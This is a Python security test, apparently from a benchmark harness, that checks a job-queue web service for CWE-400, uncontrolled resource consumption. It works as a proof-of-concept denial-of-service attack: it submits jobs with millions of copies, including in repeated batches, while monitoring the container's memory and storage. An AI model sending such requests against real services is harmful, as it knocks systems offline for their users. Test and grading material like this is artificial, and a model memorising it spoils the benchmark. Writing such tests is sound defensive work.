...
def sec_test_uncontrolled_resource_consumption(
    ...
    """
    PoC for CWE-400: Enqueue an extremely large number of job copies to force
    memory/CPU/storage pressure via massive in-memory arrays and response serialization.
    If that fails to register, fall back to batching smaller large-copy requests.
    """
    findings: set[cwes.CWE] = set()

    def _fire_and_forget_large_submit(
        app: AppInstance,
        spool_id: str,
        submit_key: str,
        text: str,
        ...
        url = f"{base_url(app)}/spools/{spool_id}/jobs"
        headers = {"X-Submit-Key": submit_key}
        payload = {"text": text, "title": None, "copies": copies}
        try:
            # Intentionally low timeout; we only need the server to start processing.
            resp = requests.post(url, headers=headers, json=payload, timeout=timeout_s)
            # Avoid touching resp.content to prevent client-side memory issues.
            app.logger.info(
                "Large submit returned early: status=%s, content_length=%s",
                resp.status_code,
                resp.headers.get("Content-Length"),
            )
        except requests.Timeout:
            app.logger.warning(
                "Large submit request timed out (expected, server likely still processing)."
            )
        except Exception as e:
            app.logger.warning(
                "Large submit raised exception (may still pressure server): %s", e
            )

    def _create_spool(app: AppInstance) -> Optional[Tuple[str, str, str]]:
        resp = create_spool(app, "q")
        _log_resp(app, "create_spool", resp)
        if resp.status_code != 201:
            app.logger.error("Spool creation failed with status %s", resp.status_code)
            return None
        keys = _get_keys_from_spool_resp(app, resp)
        if not keys:
            return None
        return keys

    try:
        app.logger.info("CWE-400 PoC starting for MicroSpool_TextJobQueue_")
        marker = generate_marker()

        keys = _create_spool(app)
        if not keys:
            app.logger.error("Aborting: could not create spool.")
            return set()
        spool_id, submit_key, fetch_key = keys

        mem_before = memory_usage(app.container_id)
        app.logger.info("Baseline memory usage: %d bytes", mem_before)

        # Start a very large-copies submission in the background to induce resource pressure.
        huge_copies = 10_000_000  # 10 million
        app.logger.info(
            "Triggering large copies submit to induce resource consumption (copies=%s).",
            huge_copies,
        )
        t = threading.Thread(
            target=_fire_and_forget_large_submit,
            args=(app, spool_id, submit_key, f"{marker} job", huge_copies, 3.0),
            daemon=True,
        )
        t.start()

        # Monitor resources for a short period while the server processes the request.
        # Thresholds tuned to detect meaningful spikes without requiring OOM.
        app.logger.info("Monitoring container resources during submission...")
        monitor_hit = monitor_container_resources(
            app.container_id,
            duration=45,
            logger=app.logger,
            memory_usage_threshold=128 * 1024 * 1024,  # 128MB
            storage_usage_threshold=1 * 1024**3,  # 1GB
        )
        if monitor_hit:
            app.logger.info("Resource monitor detected threshold exceedance.")
            findings.add(cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION)

        # Attempt to fetch a few jobs to confirm a deep backlog with our marker.
        # Even one successful fetch indicates at least partial enqueuing started.
        marker_fetches = 0
        for i in range(6):
            try:
                r = fetch_next_job(app, spool_id, fetch_key)
                _log_resp(app, f"fetch_next_job[{i}]", r)
                if r.status_code == 200:
                    data = parse_json_safely(app, r)
                    if isinstance(data, dict) and isinstance(data.get("text"), str):
                        if marker in data["text"]:
                            marker_fetches += 1
                    # If we fetched one job and there's still a backlog, later fetches should continue returning 200.
                elif r.status_code == 204:
                    # No jobs yet; wait a bit and retry as enqueue might still be ongoing.
                    pass
            except Exception as e:
                app.logger.warning("Fetch attempt failed: %s", e)
            time.sleep(0.75)

        if marker_fetches >= 1:
            app.logger.info(
                "Successfully fetched at least one marker job; queue growth underway."
            )
            findings.add(cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION)

        # Re-check memory usage delta after the window.
        mem_after = memory_usage(app.container_id)
        mem_delta = mem_after - mem_before
        app.logger.info("Memory usage after: %d bytes (delta=%d)", mem_after, mem_delta)
        if mem_delta >= 64 * 1024 * 1024:  # 64MB delta considered significant
            findings.add(cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION)

        # If primary attempt didn't register, try batch amplification to accumulate pressure.
        if not findings:
            app.logger.info(
                "Primary large-copies attempt inconclusive; trying batched submissions."
            )
            batch_copies = 1_000_000
            batches = 5
            for b in range(batches):
                try:
                    app.logger.info(
                        "Submitting batch %d/%d (copies=%d).",
                        b + 1,
                        batches,
                        batch_copies,
                    )
                    _fire_and_forget_large_submit(
                        app,
                        spool_id,
                        submit_key,
                        f"{marker} job",
                    ...
                    app.logger.warning("Batched submit exception: %s", e)
                time.sleep(1.0)

            # Short follow-up monitor to catch cumulative effects
            app.logger.info("Monitoring resources after batched submissions...")
            monitor_hit2 = monitor_container_resources(
                app.container_id,
                duration=30,
                logger=app.logger,
                memory_usage_threshold=96 * 1024 * 1024,
                storage_usage_threshold=512 * 1024 * 1024,
            )
            if monitor_hit2:
                app.logger.info(
                    "Resource monitor detected threshold exceedance after batching."
                )
                findings.add(cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION)

            # Try a couple more fetches to see backlog.
            extra_marker_fetches = 0
            for i in range(3):
                r = fetch_next_job(app, spool_id, fetch_key)
                _log_resp(app, f"fetch_next_job_post_batch[{i}]", r)
                if r.status_code == 200:
                    data = parse_json_safely(app, r)
                    if isinstance(data, dict) and isinstance(data.get("text"), str):
                        if marker in data["text"]:
                            extra_marker_fetches += 1
                time.sleep(0.5)
            if extra_marker_fetches >= 1:
                findings.add(cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION)

        # Final determination
        if findings:
            app.logger.info(
                "CWE-400 PoC successful: uncontrolled resource consumption demonstrated."
            )
            return {cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION}

        app.logger.info("CWE-400 PoC inconclusive: no sufficient indicators observed.")
        return set()

    except Exception as e:
        app.logger.exception("CWE-400 PoC encountered an unexpected error: %s", e)
        return set()
